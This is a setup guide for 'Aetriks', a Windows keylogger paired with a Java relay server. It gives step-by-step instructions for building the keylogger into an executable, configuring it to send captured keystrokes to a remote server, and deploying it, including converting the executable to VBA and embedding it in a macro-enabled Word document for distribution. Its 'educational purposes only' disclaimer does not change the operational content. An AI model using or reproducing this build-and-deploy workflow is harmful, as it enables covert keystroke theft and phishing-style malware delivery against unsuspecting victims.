# Aetriks Setup Guide

This guide provides detailed instructions for setting up and running the Aetriks keylogger project.

## Prerequisites

### For Keylogger (Windows)
- Python 3.7 or higher
- pip package manager
- Windows operating system
- Network connectivity

### For Relay Server (Any OS)
- Java 17 or higher
- Maven 3.6 or higher
- Network connectivity

## Step-by-Step Setup

### 1. Clone the Repository

```bash
git clone https://github.com/frHimanshu/aetriks-relay.git
cd aetriks-relay
```

### 2. Set Up the Relay Server

#### Option A: Using Build Scripts (Windows)
```bash
# Build the server
scripts\build_relay_server.bat

# Run the server
scripts\run_relay_server.bat
```

#### Option B: Manual Setup
```bash
# Navigate to relay server directory
cd relay-server

# Build the project
mvn clean install

# Run the server
mvn spring-boot:run
```

The server will start on `http://localhost:8080`

### 3. Configure the Keylogger

1. Edit `keylogger/config.json`:
```json
{
    "ip_address": "YOUR_SERVER_IP",
    "port_number": 8080,
    "time_interval": 10
}
```

2. Replace `YOUR_SERVER_IP` with:
   - `127.0.0.1` for local testing
   - Your server's actual IP address for remote deployment

### 4. Build the Keylogger

#### Option A: Using Build Scripts (Windows)
```bash
scripts\build_keylogger.bat
```

#### Option B: Manual Setup
```bash
# Navigate to keylogger directory
cd keylogger

# Install dependencies
pip install -r requirements.txt

# Build executable
pyinstaller --onefile --name aetriks-keylogger --add-data=config.json:. keylogger.py
```

The executable will be created at `keylogger/dist/aetriks-keylogger.exe`

### 5. Test the Setup

1. Start the relay server
2. Run the keylogger executable
3. Type some text
4. Check the server logs at `http://localhost:8080`

## Advanced Configuration

### Relay Server Configuration

Edit `relay-server/src/main/resources/application.properties`:

```properties
# Server Configuration
server.port=8080
server.address=0.0.0.0

# Logging Configuration
logging.level.root=INFO
logging.file.name=logs/aetriks-relay.log

# HTTP Encoding Configuration
spring.http.encoding.charset=UTF-8
spring.http.encoding.enabled=true
spring.http.encoding.force=true
```

### Keylogger Configuration

The keylogger supports the following configuration options:

- `ip_address`: Server IP address
- `port_number`: Server port number
- `time_interval`: Data transmission interval in seconds

## Deployment Options

### 1. Executable Deployment
- Build the executable using PyInstaller
- Distribute the `.exe` file
- Ensure the target has network access to your server

### 2. VBA Document Deployment
1. Build the executable
2. Convert to VBA:
   ```bash
   cd keylogger
   python exe_to_vba.py dist/aetriks-keylogger.exe
   ```
3. Embed the generated VBA code in a Word document
4. Save as `.docm` (macro-enabled)
5. Distribute the document

### 3. Source Code Deployment
- Copy the Python source files
- Install dependencies on target
- Run directly with Python

## Troubleshooting

### Common Issues

1. **Connection Refused**
   - Check if the relay server is running
   - Verify IP address and port in config.json
   - Ensure firewall allows the connection

2. **Build Failures**
   - Ensure all dependencies are installed
   - Check Python and Java versions
   - Verify Maven is properly configured

3. **Permission Errors**
   - Run as administrator if needed
   - Check antivirus software settings
   - Ensure proper file permissions

### Debug Mode

Enable debug logging by modifying the keylogger:

```python
# Add to keylogger.py
import logging
logging.basicConfig(level=logging.DEBUG)
```

## Security Considerations

1. **Network Security**
   - Use HTTPS in production
   - Implement proper authentication
   - Restrict network access

2. **Data Protection**
   - Encrypt sensitive data
   - Implement access controls
   - Regular security audits

3. **Legal Compliance**
   - Ensure proper authorization
   - Follow local regulations
   - Document usage policies

## Support

For issues and questions:
- Discord: `_himanshu__`
- GitHub: [frHimanshu](https://github.com/frHimanshu)

## Legal Notice

This software is for educational purposes only. Users are responsible for ensuring they have proper authorization before use. 